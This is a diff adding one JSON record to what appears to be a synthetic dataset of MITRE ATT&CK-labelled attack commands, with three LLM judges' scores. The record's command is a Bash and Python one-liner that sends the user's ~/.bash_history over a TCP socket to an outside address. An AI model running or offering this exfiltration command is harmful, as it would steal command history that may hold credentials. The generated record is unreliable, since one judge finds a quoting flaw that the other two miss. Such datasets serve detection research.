@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "IP=\"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\"; python3 -c \"import socket; s=socket.socket(); s.bind(('\"$IP\"',0)); s.connect(('203.0.113.90',54921)); s.sendall(open('/Users/$USER/.bash_history','rb').read()); s.close()\"",
+  "explanation": "Executes a Python TCP client bound to the Thunderbolt Bridge IP to exfiltrate content over a non-primary interface, consistent with T1011.",
+  "rationale_steps": [
+    "Get Thunderbolt Bridge IP via networksetup",
+    "Bind a user-space TCP socket to that IP",
+    "Send file content to a high, uncommon port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-6b36bb00",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, proper separators, valid flags, and a Python one-liner that is syntactically valid.",
+        "semantic_score": 3,
+        "semantic_justification": "It targets exfiltration via a non-primary interface, but embeds the local IP as '\"IP\"' in Python causing an invalid bind address and uses 203.0.113.90 (TEST-NET-3), making successful exfiltration unlikely.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T01:33:24.458770Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid variable assignment, correct awk syntax, and properly structured Python code with appropriate quoting and escaping.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by retrieving the Thunderbolt Bridge interface IP (a non-primary network medium), establishing a socket connection through it, and exfiltrating the user's bash history to an external server.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:33:31.712628Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct command substitution, balanced quotes, valid bash and Python syntax, and proper command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly identifies and binds to the IP of the 'Thunderbolt Bridge' interface to exfiltrate the bash history over a non-primary network medium, directly aligning with T1011's intent and operational plausibility.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:33:23.238879Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
